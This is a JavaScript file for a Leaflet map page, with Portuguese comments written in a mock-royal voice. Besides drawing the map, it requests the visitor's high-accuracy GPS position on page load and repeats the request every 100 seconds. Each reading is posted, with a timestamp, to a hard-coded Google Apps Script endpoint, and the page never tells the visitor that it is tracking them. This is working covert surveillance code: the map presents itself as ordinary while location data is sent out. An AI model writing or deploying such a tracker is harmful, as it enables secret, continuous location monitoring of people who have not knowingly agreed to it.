$(document).ready(function () {
    // MAPA DO TERRITÓRIO REAL
    var map = L.map('map', {
        scrollWheelZoom: false
    }).setView([-23.4866, -46.3487], 16);

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 19
    }).addTo(map);

    // FUNÇÃO PARA CAPTURAR E ENVIAR OS DADOS DO SÚDITO
    function capturarLocalizacaoReal() {
        if (!navigator.geolocation) {
            console.error("Alerta Real: Este navegador é indigno e não possui GPS.");
            return;
        }

        // O MOMENTO DO CONSENTIMENTO: O navegador pedirá permissão aqui
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                // Súdito concedeu a graça! Enviando ao Script do Google...
                const dados = {
                    timestamp: new Date().toISOString(),
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,
                    precisao: pos.coords.accuracy,
                    status: navigator.onLine ? 'online' : 'offline'
                };

                fetch('https://script.google.com/macros/s/AKfycbzn5ZlIImjgl-98ECy2bruU7ZU30Er2SUpl8FKdVCizG6mcTDaQUl2T9mghQkizXePD2Q/exec', {
                    method: 'POST',
                    mode: 'no-cors', // Atravessa a alfândega do CORS sem conflitos
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(dados)
                }).then(() => console.log("Dados enviados ao trono com sucesso."));
            },
            (erro) => {
                // Caso o súdito negue a permissão ou o GPS falhe
                switch(erro.code) {
                    case erro.PERMISSION_DENIED:
                        console.error("O súdito negou o acesso à localização, Majestade!");
                        break;
                    case erro.POSITION_UNAVAILABLE:
                        console.error("O sinal de GPS está fraco nas fronteiras.");
                        break;
                    case erro.TIMEOUT:
                        console.error("A requisição expirou no tempo de espera real.");
                        break;
                }
            },
            { enableHighAccuracy: true, timeout: 10000 } // Busca a máxima precisão real
        );
    }

    // DISPARO AUTOMÁTICO AO CARREGAR A PÁGINA
    // Nota: Muitos navegadores modernos só mostram o popup após uma interação (clique)
    capturarLocalizacaoReal();

    // RASTREIO CONTÍNUO A CADA 100 SEGUNDOS
    setInterval(capturarLocalizacaoReal, 100000);
});
